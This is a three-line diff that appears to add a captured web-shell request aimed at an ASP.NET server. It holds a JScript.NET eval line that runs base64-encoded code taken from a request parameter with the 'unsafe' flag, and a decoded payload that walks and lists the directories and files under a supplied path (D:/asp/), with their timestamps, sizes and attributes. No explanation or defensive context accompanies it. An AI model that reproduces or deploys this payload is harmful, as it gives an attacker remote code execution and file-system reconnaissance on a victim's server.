@@ -1,0 +1,3 @@
+pass=eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item["fb25f469c1a6f4"])),"unsafe");
+fb25f469c1a6f4=var D=System.Text.Encoding.GetEncoding("UTF-8").GetString(System.Convert.FromBase64String(Request.Item["x669153f31a2fc"].substr(2)));var m=new System.IO.DirectoryInfo(D);var s=m.GetDirectories();var P:String;var i;function T(p:String):String{return System.IO.File.GetLastWriteTime(p).ToString("yyyy-MM-dd HH:mm:ss");}for(i in s){P=D+s[i].Name;Response.Write(s[i].Name+"/\t"+T(P)+"\t0\t"+(s[i].Attributes)+"\n");}s=m.GetFiles();for(i in s){P=D+s[i].Name;Response.Write(s[i].Name+"\t"+T(P)+"\t"+s[i].Length+"\t"+(s[i].Attributes)+"\n");}
+x669153f31a2fc=D:/asp/
